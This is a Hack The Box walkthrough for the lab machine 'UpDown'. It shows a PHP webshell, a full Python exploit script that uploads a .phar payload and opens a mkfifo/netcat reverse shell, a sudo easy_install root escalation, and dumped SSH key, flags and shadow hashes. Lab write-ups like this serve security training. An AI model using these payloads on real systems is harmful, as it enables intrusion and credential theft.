---
layout: single
title: UpDown - Hack The Box
excerpt: "UpDown is a medium-rated Linux machine from Hack The Box. Just as it's name this box has it's Ups and Downs. The path to foothold was very fun and fairly easy solved using python, I took my time to write a script to streamline the attack chain. However once on the box, both privilege escalation vectors from www-data to user, and user to root, was very underwhelming and solved in under 10 minutes total. For me this was an easy medium box, and I did enjoy most of it. I learned a few new things and but mostly deepened my knowledge about PHP."
date: 2022-09-07
classes: wide
header:
  teaser: /assets/images/htb-writeup-updown/updown_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
  unreleased: true
categories:
  - hackthebox
tags:  
  - linux
  - medium
  - git
  - custom header
  - file upload
  - phar
  - proc_open
  - python
---

![](/assets/images/htb-writeup-updown/updown_logo.png){: style="float: right; width: 200px; margin-left: 2em"}

UpDown is a medium-rated Linux machine from Hack The Box. Just as it's name this box has it's Ups and Downs. The path to foothold was very fun and fairly easy solved using python, I took my time to write a script to streamline the attack chain. However once on the box, both privilege escalation vectors from www-data to user, and user to root, was very underwhelming and solved in under 10 minutes total. For me this was an easy medium box, and I did enjoy most of it. I learned a few new things and but mostly deepened my knowledge about PHP. 

----------------

# USER
### Step 1
```bash
➜  updown nmap -Pn -n -p- 10.129.5.88
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

➜  updown nmap -Pn -n -p22,80 -sCV 10.129.5.88
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Is my Website up ?
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
==> DIRECTORY: http://10.129.5.88/dev/                                                                                                                       
+ http://10.129.5.88/index.php (CODE:200|SIZE:1131)                                                                                                          
+ http://10.129.5.88/server-status (CODE:403|SIZE:276)                                                                                                       
                                                                                                                                                             
---- Entering directory: http://10.129.5.88/dev/ ----
+ http://10.129.5.88/dev/.git/HEAD (CODE:200|SIZE:21)                                                                                                        
+ http://10.129.5.88/dev/index.php (CODE:200|SIZE:0)     
```

Visiting the webservice on port 80 we find a site that lets us check if a website is Up or Down. In the footer we find the domain `siteisup.htb`, add it to `/etc/hosts`
![[/assets/images/htb-writeup-updown/updown01.png]]

As dirbuster found a `.git` directory, that also have directory listing, we can simply download all the files using wget:
```bash
➜  updown wget --mirror -I /dev/.git siteisup.htb/dev/.git/
```

Changing directory to the `/dev` folder, our zsh shell tells us that we're now in a git-tracked directory (see the 'main'-branch hint).
```bash
➜  .git git:(main) pwd
/htb/updown/siteisup.htb/dev/
```

We can from here run git-commands, find changes and restore files.
```bash
➜  dev git:(main) ✗ git status
On branch main
Your branch is up to date with 'origin/main'.

Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
	deleted:    .htaccess
	deleted:    admin.php
	deleted:    changelog.txt
	deleted:    checker.php
	deleted:    index.php
	deleted:    stylesheet.css

➜  dev git:(main) git restore admin.php changelog.txt checker.php .htaccess index.php stylesheet.css
➜  dev git:(main) git status
On branch main
Your branch is up to date with 'origin/main'.

nothing to commit, working tree clean
➜  dev git:(main) ls -al
total 40
drwxr-xr-x 3 void void 4096 Sep  6 10:00 .
drwxr-xr-x 3 void void 4096 Sep  6 09:55 ..
-rw-r--r-- 1 void void   59 Sep  6 10:00 admin.php
-rw-r--r-- 1 void void  147 Sep  6 10:00 changelog.txt
-rw-r--r-- 1 void void 3145 Sep  6 10:00 checker.php
drwxr-xr-x 8 void void 4096 Sep  6 10:00 .git
-rw-r--r-- 1 void void  117 Sep  6 10:00 .htaccess
-rw-r--r-- 1 void void  273 Sep  6 10:00 index.php
-rw-r--r-- 1 void void 5531 Sep  6 10:00 stylesheet.css
```

Looking through the files we find that there's probably a upload function somewhere:
```bash
➜  dev git:(main) cat changelog.txt
Beta version

1- Check a bunch of websites.

-- ToDo:

1- Multithreading for a faster version :D.
2- Remove the upload option.
3- New admin panel.
```

Interesting source code from `checker.php`:
```bash
➜  dev git:(main) cat checker.php
[... snip ...]
function isitup($url){
	$ch=curl_init();
	curl_setopt($ch, CURLOPT_URL, trim($url));
	curl_setopt($ch, CURLOPT_USERAGENT, "siteisup.htb beta");
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_TIMEOUT, 30);
	$f = curl_exec($ch);
	$header = curl_getinfo($ch);
	if($f AND $header['http_code'] == 200){
		return array(true,$f);
	}else{
		return false;
	}
    curl_close($ch);
}

if($_POST['check']){
  
	# File size must be less than 10kb.
	if ($_FILES['file']['size'] > 10000) {
        die("File too large!");
    }
	$file = $_FILES['file']['name'];
	
	# Check if extension is allowed.
	$ext = getExtension($file);
	if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
		die("Extension not allowed!");
	}
  
	# Create directory to upload our file.
	$dir = "uploads/".md5(time())."/";
	if(!is_dir($dir)){
        mkdir($dir, 0770, true);
    }
  
  # Upload the file.
	$final_path = $dir.$file;
	move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
	
  # Read the uploaded file.
	$websites = explode("\n",file_get_contents($final_path));
	
	foreach($websites as $site){
		$site=trim($site);
		if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
			$check=isitup($site);
			if($check){
				echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
			}else{
				echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
			}	
		}else{
			echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
		}
	}
	
  # Delete the uploaded file.
	@unlink($final_path);
}
```

Index.php:
```bash
➜  dev git:(main) cat index.php
<b>This is only for developers</b>
<br>
<a href="?page=admin">Admin Panel</a>
<?php
	define("DIRECTACCESS",false);
	$page=$_GET['page'];
	if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
		include($_GET['page'] . ".php");
	}else{
		include("checker.php");
	}	
?>
```

No matter how much I try to get to anything else then `checker.php`  it fails.. so instead of wasting more time, lets dig deeper into `.git`
```bash
➜  dev git:(main) git log
[... snip ...]
commit 8812785e31c879261050e72e20f298ae8c43b565
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 16:38:54 2021 +0200

    New technique in header to protect our dev vhost.

commit bc4ba79e596e9fd98f1b2837b9bd3548d04fe7ab
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 16:37:20 2021 +0200

    Update .htaccess
    
    New technique in header to protect our dev vhost.


➜  dev git:(main) git diff bc4ba79e596e9fd98f1b2837b9bd3548d04fe7ab
diff --git a/.htaccess b/.htaccess
index 44ff240..b317ab5 100644
--- a/.htaccess
+++ b/.htaccess
@@ -2,3 +2,4 @@ SetEnvIfNoCase Special-Dev "only4dev" Required-Header
 Order Deny,Allow
 Deny from All
 Allow from env=Required-Header
```

With this information, there should be a vhost named `dev` and we should reach it but using header `Special-Dev "only4dev"`. We can verify that this works with curl (`curl http://dev.siteisup.htb -H 'Special-Dev: only4dev'`), but if you want to view it in Firefox we can add a **Session Handling Rule** in Burp and invoke the extension **Add Custom Header**.

Burp Extension _Add Custom Header_:
![[/assets/images/htb-writeup-updown/updown02.png]]

Project Options > Add _Session Handling Rules_ > _Invoke a Burp extension_:
![[/assets/images/htb-writeup-updown/updown03.png]]

Change _URL Scope_ and add _Proxy_ to _Tools Scope_, and you should now be able to browse `http://dev.siteisup.htb` and upload files:
![[/assets/images/htb-writeup-updown/updown04.png]]


### Step 2
We know from the source code (`checker.php`) that following extensions is blocked: `php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar`.
We also have to adapt to the max file size of 10kb: `$_FILES['file']['size'] > 10000`
Lastly, the following wrappers are also blocked: `!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site`

Reading about [file upload](https://book.hacktricks.xyz/pentesting-web/file-upload) on HackTricks these are listed as usefull extensions for PHP:
`.php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc`

Playing around and testing to upload stuff I am able to upload this file:
```bash
➜  updown cat shell.pht
<?php echo "Shell";system($_GET['cmd']); ?>
```

However when looking in the uploads directory (`http://dev.siteisup.htb/uploads/`) a directory is created but no file is in the dir..
Going back to the code, this probably have something to do with below line from `checker.php`, that's invoked after reading the uploaded file.
```bash
  # Delete the uploaded file.
	@unlink($final_path);
```

After a lot of playing around I noticed that when uploading a file, simply add some URL in the end of your code so the server will spend time to check if it's up or not. This will keep the file alive long enough for us to see the content.

```bash
➜  updown cat shell.phar 
<?php phpinfo(); ?>
https://exploit.se
https://exploit.se
```

![[/assets/images/htb-writeup-updown/updown05.png]]

The `disabled_functions` are as following:
```bash
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,error_log,system,exec,shell_exec,popen,passthru,link,symlink,syslog,ld,mail,stream_socket_sendto,dl,stream_socket_client,fsockopen
```

Our normal one-line webshell are hurting since `system`, `passthru`, `shell_exec`, `exec`, `popen` and `pcntl_exec` are all disabled, however `proc_open` is not. Here's a list of [dangerous php functions](https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720).

To stream line this process I wrote a script to write a malicious `.phar` file, upload the it to the target and gather the data. 
The script have two flags.. 
.. `-c` / `--command` for command injection
.. `-r` / `reverse` automatically trigger a reverse shell

```bash
➜  updown python3 updown_rce.py -c "hostname && id"

  _   _       ____                      
 | | | |_ __ |  _ \  _____      ___ __  
 | | | | '_ \| | | |/ _ \ \ /\ / / '_ \ 
 | |_| | |_) | |_| | (_) \ V  V /| | | |
  \___/| .__/|____/ \___/ \_/\_/ |_| |_|
       |_|     by 0xPThree - exploit.se 
       

[+] File uploaded to: http://dev.siteisup.htb/uploads/1e0087c3c8c5df2f1f97f1cd169b705f/05f6adf04d44.phar
[+] Executing command 'hostname && id'...
[+] Response: updown
uid=33(www-data) gid=33(www-data) groups=33(www-data)

https://exploit.se

time elapsed: 0.284085750579834 seconds
```

```bash
➜  updown python3 updown_rce.py -r                 

  _   _       ____                      
 | | | |_ __ |  _ \  _____      ___ __  
 | | | | '_ \| | | |/ _ \ \ /\ / / '_ \ 
 | |_| | |_) | |_| | (_) \ V  V /| | | |
  \___/| .__/|____/ \___/ \_/\_/ |_| |_|
       |_|     by 0xPThree - exploit.se 
       

[+] File uploaded to: http://dev.siteisup.htb/uploads/102fe1680abe9017c824e82855db0674/71926ca1faf8.phar
[+] Preparing reverse shell
[+] Starting listener on port 4488
listening on [any] 4488 ...
connect to [10.10.14.14] from (UNKNOWN) [10.129.4.182] 41428
/bin/sh: 0: cant access tty; job control turned off
$ id && hostname
uid=33(www-data) gid=33(www-data) groups=33(www-data)
updown
```

Full script is found HERE.
```python
#!/usr/bin/env python3
# by 0xPThree - exploit.se
#
# Usage example:
# python3 updown_rce.py -r
# python3 updown_rce.py -c "ls -al"

from colorama import Fore, Style
import requests, argparse, time, re, random
import netifaces as ni

def createPayload(command):
    file_name = ''.join(random.choices("abcdef0123456789", k=12)) + ".phar"
    with open(file_name, 'w') as f:
        f.writelines([
f'''<?php
    $cmd = '{command}';

    $desc = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w'));
    $pipes = array();

    $process = proc_open($cmd, $desc, $pipes);
    fclose($pipes[0]);
    $string = array(stream_get_contents($pipes[1]), stream_get_contents($pipes[2]));
    proc_close($process);

    print_r($string[0]);
?>

https://exploit.se'''
            ])
    return(file_name)


def uploadFile(url, file):
    # Declare variables
    headers = {'Special-Dev': 'only4dev'}
    files = {'file': open(file, 'rb')}
    data = {'check': 'check'}

    # Send GET to extract all md5 values
    cache_content = requests.get(url + 'uploads/', headers=headers)
    md5_pre = re.findall("[a-f0-9]{32}", cache_content.text)

    # Send POST to upload file
    try:
        requests.post(url, headers=headers, files=files, data=data, timeout=0.05)
    except requests.exceptions.ReadTimeout: 
        pass
    
    # Send GET to compare md5 value against first to extract unique path name
    cache_content = requests.get(url + 'uploads/', headers=headers)
    md5_post = re.findall("[a-f0-9]{32}", cache_content.text)
    md5_dir_list = list(set(md5_post) - set(md5_pre))
    md5_dir = md5_dir_list[0]
    
    full_url = url + 'uploads/' + md5_dir + '/' + file
    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} File uploaded to: {full_url}")
    return(full_url)


def getIP():
    ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
    return(ip)


def execute(url, command, ip=None):
    if command == f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} 4488 >/tmp/f":
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Preparing reverse shell")
        print (f"{Fore.GREEN}[+]{Style.RESET_ALL} Starting listener on port 4488")
        from subprocess import Popen
        Popen("nc -lvnp 4488",shell=True)
        requests.get(url, headers={'Special-Dev': 'only4dev'})
    elif ip == None:
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Executing command '{command}'...")
        output = requests.get(url, headers={'Special-Dev': 'only4dev'})
        if output.status_code == 200:
            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Response: {output.text}")
        else:
            print(f"{Fore.RED}[-]{Style.RESET_ALL} Response code: {output.status_code} \n{Fore.RED}[-]{Style.RESET_ALL} Data: {output.text}")


def asciiArt():
    print(Fore.CYAN + '''
  _   _       ____                      
 | | | |_ __ |  _ \  _____      ___ __  
 | | | | '_ \| | | |/ _ \ \ /\ / / '_ \ 
 | |_| | |_) | |_| | (_) \ V  V /| | | |
  \___/| .__/|____/ \___/ \_/\_/ |_| |_|
       |_|     by 0xPThree - exploit.se 
       \n''')

def main():
    start = time.time()
    formatter = lambda prog: argparse.HelpFormatter(prog,max_help_position=70)
    parser = argparse.ArgumentParser(formatter_class=formatter)
    parser.add_argument('-c','--command', type=str, help='command to execute')
    parser.add_argument('-r','--reverse', action='store_true', help='create reverse shell')
    args = parser.parse_args()

    base_url = 'http://dev.siteisup.htb/'

    asciiArt()

    if args.reverse:
        ip = getIP()
        shell = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} 4488 >/tmp/f"
        file_name = createPayload(shell)
        rce_url = uploadFile(base_url, file_name)
        execute(rce_url, shell, ip)
    else:
        file_name = createPayload(args.command)
        rce_url = uploadFile(base_url, file_name)
        execute(rce_url, args.command)
        
        end = time.time()
        print(f"\ntime elapsed: {end - start} seconds")

    
if __name__ == "__main__":
    main()
```


### Step 3
With a shell, the privilege escalation vector is quite obvious, we have **SUID** bit as `developer` on `siteisup` binary:
```bash
www-data@updown:/home/developer/dev$ ls -al
total 32
drwxr-x--- 2 developer www-data   4096 Jun 22 15:45 .
drwxr-xr-x 6 developer developer  4096 Aug 30 11:24 ..
-rwsr-x--- 1 developer www-data  16928 Jun 22 15:45 siteisup
-rwxr-x--- 1 developer www-data    154 Jun 22 15:45 siteisup_test.py

www-data@updown:/home/developer/dev$ file siteisup
siteisup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b5bbc1de286529f5291b48db8202eefbafc92c1f, for GNU/Linux 3.2.0, not stripped
```

We can assume that the code from `siteisup` is the same as the python script:
```bash
www-data@updown:/home/developer/dev$ cat siteisup_test.py
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
	print "Website is up"
else:
	print "Website is down"
```

`import()` is generally seen as a dangerous function, together with `eval()` and `exec()`, we can easily break out from the program and get a shell as `developer`:
```bash
www-data@updown:/home/developer/dev$ ./siteisup
Welcome to 'siteisup.htb' application

Enter URL here:__import__('os').system('/bin/bash')
developer@updown:/home/developer/dev$ id
uid=1002(developer) gid=33(www-data) groups=33(www-data)

developer@updown:/home/developer$ cat user.txt
107ab9b44d8853f426ebe841cdae9cbf

developer@updown:/home/developer/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

---------------

# ROOT
### Step 1
Running `sudo -l` shows us the privilege escalation vector:
```bash
developer@updown:/dev/shm$ sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install
```

Looking up _easy_install_ on [gtfobins](https://gtfobins.github.io/gtfobins/easy_install/) we get the syntax to instantly spawn a root shell.

```bash
developer@updown:/dev/shm$ TF=$(mktemp -d)
developer@updown:/dev/shm$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
developer@updown:/dev/shm$ sudo /usr/local/bin/easy_install $TF
WARNING: The easy_install command is deprecated and will be removed in a future version.
Processing tmp.i7LFwunRkU
Writing /tmp/tmp.i7LFwunRkU/setup.cfg
Running setup.py -q bdist_egg --dist-dir /tmp/tmp.i7LFwunRkU/egg-dist-tmp-2bXqH_
# id
uid=0(root) gid=0(root) groups=0(root)

# cat /root/root.txt
72fa86fbc9173578b5df7f17dd9d3933

# cat /etc/shadow 
root:$6$35UwqDmGM31K3z1O$EV0yHaLbvEqQ1YfxHOl4fMFHnR0O0Lo7RSnFGpYdfUwBmec0/5JWenL6GLivYgeka8Z4XyYW2UhWOV5UOdK0w.:19165:0:99999:7:::
developer:$6$LkPh3nNMEVO.zmIc$I/j67KSo1n7pR.fzcMfH/hc/8EYISX8JUtDpoc7iMIiYEhX4bgVXPV4L6Gam3AvxMd46wh5XTulsxbpy9ezLf/:19165:0:99999:7:::
```
